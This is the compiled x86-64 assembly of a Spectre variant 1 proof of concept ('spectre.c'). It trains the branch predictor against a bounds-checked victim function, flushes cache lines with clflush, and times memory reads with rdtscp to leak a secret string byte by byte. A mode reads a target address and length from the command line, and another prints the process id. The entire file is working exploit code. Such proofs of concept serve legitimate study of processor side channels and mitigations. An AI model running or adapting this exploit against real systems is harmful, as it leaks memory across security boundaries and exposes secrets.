	.file	"spectre.c"
	.intel_syntax noprefix
	.text
	.p2align 4
	.globl	check
	.type	check, @function
check:
.LFB5689:
	.cfi_startproc
	endbr64
	movsx	rax, DWORD PTR array1_size[rip]
	cmp	rax, rdi
	seta	al
	movzx	eax, al
	ret
	.cfi_endproc
.LFE5689:
	.size	check, .-check
	.p2align 4
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5690:
	.cfi_startproc
	endbr64
	movsx	rax, DWORD PTR array1_size[rip]
	cmp	rax, rdi
	jbe	.L3
	lea	rax, array1[rip]
	lea	rdx, array2[rip]
	movzx	eax, BYTE PTR [rax+rdi]
	sal	eax, 9
	cdqe
	movzx	eax, BYTE PTR [rdx+rax]
	and	BYTE PTR temp[rip], al
.L3:
	ret
	.cfi_endproc
.LFE5690:
	.size	victim_function, .-victim_function
	.p2align 4
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5691:
	.cfi_startproc
	endbr64
	push	r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	lea	r10, results.0[rip]
	mov	ecx, 128
	push	r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	mov	r14d, 2863311531
	push	r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	lea	r13, array1[rip]
	push	r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	lea	r12, array2[rip]
	push	rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	lea	rbp, 131072[r12]
	push	rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	mov	ebx, 999
	sub	rsp, 56
	.cfi_def_cfa_offset 112
	mov	QWORD PTR 8[rsp], rdi
	mov	rdi, r10
	lea	r11, 32[rsp]
	mov	QWORD PTR 16[rsp], rsi
	mov	QWORD PTR 24[rsp], rdx
	mov	rax, QWORD PTR fs:40
	mov	QWORD PTR 40[rsp], rax
	xor	eax, eax
	mov	DWORD PTR 32[rsp], 0
	rep stosq
.L6:
	lea	rax, array2[rip]
	.p2align 4,,10
	.p2align 3
.L7:
	clflush	[rax]
	add	rax, 512
	cmp	rax, rbp
	jne	.L7
	mov	esi, DWORD PTR array1_size[rip]
	mov	eax, ebx
	mov	r9d, 29
	cdq
	idiv	esi
	mov	rsi, QWORD PTR 8[rsp]
	movsx	rcx, edx
	xor	rsi, rcx
	.p2align 4,,10
	.p2align 3
.L9:
	clflush	array1_size[rip]
	mov	DWORD PTR 36[rsp], 0
	mov	eax, DWORD PTR 36[rsp]
	cmp	eax, 99
	jg	.L11
	.p2align 4,,10
	.p2align 3
.L8:
	mov	eax, DWORD PTR 36[rsp]
	add	eax, 1
	mov	DWORD PTR 36[rsp], eax
	mov	eax, DWORD PTR 36[rsp]
	cmp	eax, 99
	jle	.L8
.L11:
	mov	eax, r9d
	imul	rax, r14
	shr	rax, 34
	lea	edx, [rax+rax*2]
	mov	eax, r9d
	add	edx, edx
	sub	eax, edx
	sub	eax, 1
	xor	ax, ax
	cdqe
	mov	rdi, rax
	shr	rdi, 16
	or	rdi, rax
	and	rdi, rsi
	xor	rdi, rcx
	call	victim_function
	sub	r9d, 1
	jnb	.L9
	mov	esi, 13
	.p2align 4,,10
	.p2align 3
.L10:
	movzx	r8d, sil
	mov	r15d, r8d
	sal	r15d, 9
	rdtscp
	mov	rdi, rax
	sal	rdx, 32
	movsx	r15, r15d
	mov	DWORD PTR [r11], ecx
	or	rdi, rdx
	movzx	eax, BYTE PTR [r12+r15]
	rdtscp
	sal	rdx, 32
	mov	DWORD PTR [r11], ecx
	or	rax, rdx
	sub	rax, rdi
	cmp	rax, 25
	ja	.L12
	mov	eax, ebx
	mov	ecx, DWORD PTR array1_size[rip]
	cdq
	idiv	ecx
	movsx	rdx, edx
	movzx	eax, BYTE PTR 0[r13+rdx]
	cmp	eax, r8d
	je	.L12
	add	DWORD PTR [r10+r8*4], 1
.L12:
	add	esi, 167
	cmp	esi, 42765
	jne	.L10
	mov	eax, 1
	xor	ecx, ecx
	xor	edx, edx
	jmp	.L13
	.p2align 4,,10
	.p2align 3
.L35:
	cmp	r9d, -1
	je	.L20
	movsx	rdi, r9d
	cmp	esi, DWORD PTR [r10+rdi*4]
	cmovge	r9d, eax
.L14:
	add	rax, 1
.L13:
	mov	edi, DWORD PTR [r10+rdx*4]
	cmp	rax, 256
	je	.L34
	mov	esi, DWORD PTR [r10+rax*4]
	cmp	esi, edi
	jl	.L35
	movsx	rdx, eax
	mov	r9d, ecx
	mov	rcx, rdx
	jmp	.L14
	.p2align 4,,10
	.p2align 3
.L20:
	mov	r9d, eax
	jmp	.L14
.L34:
	movsx	rsi, r9d
	mov	eax, DWORD PTR [r10+rsi*4]
	lea	r8d, 4[rax+rax]
	cmp	r8d, edi
	jl	.L16
	cmp	edi, 2
	jne	.L21
	test	eax, eax
	je	.L16
.L21:
	sub	ebx, 1
	jne	.L6
.L16:
	mov	rbx, QWORD PTR 16[rsp]
	mov	eax, DWORD PTR results.0[rip]
	xor	eax, DWORD PTR 32[rsp]
	mov	DWORD PTR results.0[rip], eax
	mov	BYTE PTR [rbx], cl
	mov	rcx, QWORD PTR 24[rsp]
	mov	eax, DWORD PTR [r10+rdx*4]
	mov	DWORD PTR [rcx], eax
	mov	BYTE PTR 1[rbx], r9b
	mov	eax, DWORD PTR [r10+rsi*4]
	mov	DWORD PTR 4[rcx], eax
	mov	rax, QWORD PTR 40[rsp]
	sub	rax, QWORD PTR fs:40
	jne	.L36
	add	rsp, 56
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	rbp
	.cfi_def_cfa_offset 40
	pop	r12
	.cfi_def_cfa_offset 32
	pop	r13
	.cfi_def_cfa_offset 24
	pop	r14
	.cfi_def_cfa_offset 16
	pop	r15
	.cfi_def_cfa_offset 8
	ret
.L36:
	.cfi_restore_state
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5691:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"Success"
.LC1:
	.string	"Unclear"
	.section	.rodata.str1.8,"aMS",@progbits,1
	.align 8
.LC2:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1
.LC3:
	.string	"%p"
.LC4:
	.string	"%d"
	.section	.rodata.str1.8
	.align 8
.LC5:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC6:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.8
	.align 8
.LC7:
	.string	"Reading at malicious_x = %p secc= %c ..."
	.section	.rodata.str1.1
.LC8:
	.string	"%s: "
.LC9:
	.string	"0x%02X='%c' score=%d "
	.section	.rodata.str1.8
	.align 8
.LC10:
	.string	"(second best: 0x%02X='%c' score=%d)"
	.section	.rodata.str1.1
.LC11:
	.string	"\n"
.LC12:
	.string	"addr = %llx, pid = %d\n"
	.section	.text.startup,"ax",@progbits
	.p2align 4
	.globl	main
	.type	main, @function
main:
.LFB5692:
	.cfi_startproc
	endbr64
	push	r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	push	r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	push	r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	push	r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	push	rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	push	rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	sub	rsp, 72
	.cfi_def_cfa_offset 128
	mov	DWORD PTR 4[rsp], edi
	mov	QWORD PTR 8[rsp], rsi
	mov	rax, QWORD PTR fs:40
	mov	QWORD PTR 56[rsp], rax
	xor	eax, eax
.L38:
	mov	rdi, QWORD PTR stdin[rip]
	call	getc@PLT
	cmp	al, 114
	je	.L56
.L39:
	cmp	al, 10
	je	.L38
	cmp	al, 105
	jne	.L48
	xor	eax, eax
	call	getpid@PLT
	mov	edi, 1
	lea	rdx, check[rip+33]
	lea	rsi, .LC12[rip]
	mov	ecx, eax
	xor	eax, eax
	call	__printf_chk@PLT
	mov	rdi, QWORD PTR stdin[rip]
	call	getc@PLT
	cmp	al, 114
	jne	.L39
.L56:
	mov	rdx, QWORD PTR secret[rip]
	lea	rsi, .LC2[rip]
	mov	edi, 1
	xor	eax, eax
	lea	rbx, array1[rip]
	mov	rcx, rdx
	call	__printf_chk@PLT
	mov	rdi, QWORD PTR secret[rip]
	mov	rax, rdi
	sub	rax, rbx
	mov	QWORD PTR 32[rsp], rax
	call	strlen@PLT
	mov	edx, 131072
	mov	esi, 1
	lea	rdi, array2[rip]
	mov	DWORD PTR 28[rsp], eax
	mov	r12d, eax
	call	memset@PLT
	cmp	DWORD PTR 4[rsp], 3
	je	.L57
.L40:
	xor	eax, eax
	mov	edx, r12d
	mov	edi, 1
	lea	rsi, .LC6[rip]
	call	__printf_chk@PLT
	sub	DWORD PTR 28[rsp], 1
	js	.L38
	xor	ebx, ebx
	lea	r14, 44[rsp]
	lea	r15, .LC7[rip]
	lea	r13, 54[rsp]
	lea	r12, .LC8[rip]
	.p2align 4,,10
	.p2align 3
.L41:
	mov	rax, QWORD PTR secret[rip]
	mov	rdx, QWORD PTR 32[rsp]
	mov	rsi, r15
	mov	edi, 1
	movsx	ecx, BYTE PTR [rax+rbx]
	xor	eax, eax
	call	__printf_chk@PLT
	mov	rdi, QWORD PTR 32[rsp]
	mov	rdx, r14
	mov	rsi, r13
	lea	rax, 1[rdi]
	mov	QWORD PTR 32[rsp], rax
	call	readMemoryByte
	mov	ebp, DWORD PTR 48[rsp]
	mov	r8d, DWORD PTR 44[rsp]
	mov	rsi, r12
	lea	rdx, .LC1[rip]
	mov	edi, 1
	lea	eax, [rbp+rbp]
	mov	DWORD PTR [rsp], r8d
	cmp	r8d, eax
	lea	rax, .LC0[rip]
	cmovge	rdx, rax
	xor	eax, eax
	call	__printf_chk@PLT
	movzx	edx, BYTE PTR 54[rsp]
	mov	r8d, DWORD PTR [rsp]
	mov	ecx, 63
	lea	rsi, .LC9[rip]
	mov	edi, 1
	mov	eax, edx
	sub	eax, 32
	cmp	al, 95
	cmovb	ecx, edx
	xor	eax, eax
	call	__printf_chk@PLT
	test	ebp, ebp
	jle	.L45
	movzx	edx, BYTE PTR 55[rsp]
	mov	ecx, 63
	mov	r8d, ebp
	lea	rsi, .LC10[rip]
	mov	edi, 1
	mov	eax, edx
	sub	eax, 32
	cmp	al, 95
	cmovb	ecx, edx
	xor	eax, eax
	call	__printf_chk@PLT
.L45:
	lea	rsi, .LC11[rip]
	mov	edi, 1
	xor	eax, eax
	add	rbx, 1
	call	__printf_chk@PLT
	mov	eax, DWORD PTR 28[rsp]
	sub	eax, 1
	mov	DWORD PTR 28[rsp], eax
	test	eax, eax
	jns	.L41
	jmp	.L38
.L48:
	mov	rax, QWORD PTR 56[rsp]
	sub	rax, QWORD PTR fs:40
	jne	.L58
	add	rsp, 72
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	xor	eax, eax
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	rbp
	.cfi_def_cfa_offset 40
	pop	r12
	.cfi_def_cfa_offset 32
	pop	r13
	.cfi_def_cfa_offset 24
	pop	r14
	.cfi_def_cfa_offset 16
	pop	r15
	.cfi_def_cfa_offset 8
	ret
.L57:
	.cfi_restore_state
	mov	r15, QWORD PTR 8[rsp]
	lea	rdx, 32[rsp]
	lea	rsi, .LC3[rip]
	xor	eax, eax
	mov	rdi, QWORD PTR 8[r15]
	call	__isoc99_sscanf@PLT
	mov	rdi, QWORD PTR 16[r15]
	lea	rdx, 28[rsp]
	xor	eax, eax
	lea	rsi, .LC4[rip]
	sub	QWORD PTR 32[rsp], rbx
	call	__isoc99_sscanf@PLT
	mov	ecx, DWORD PTR 28[rsp]
	mov	rdx, QWORD PTR 32[rsp]
	xor	eax, eax
	lea	rsi, .LC5[rip]
	mov	edi, 1
	call	__printf_chk@PLT
	mov	r12d, DWORD PTR 28[rsp]
	jmp	.L40
.L58:
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5692:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.globl	secret
	.section	.rodata.str1.8
	.align 8
.LC13:
	.string	"The Magic Words are Squeamish Ossifrage.testtesttesttesttesttesttestetsttesttesttettesttstete stetstetstteststsetttstttststtesttstetstse"
	.section	.data.rel.local,"aw"
	.align 8
	.type	secret, @object
	.size	secret, 8
secret:
	.quad	.LC13
	.globl	array2
	.data
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	131055
	.globl	unused2
	.bss
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:
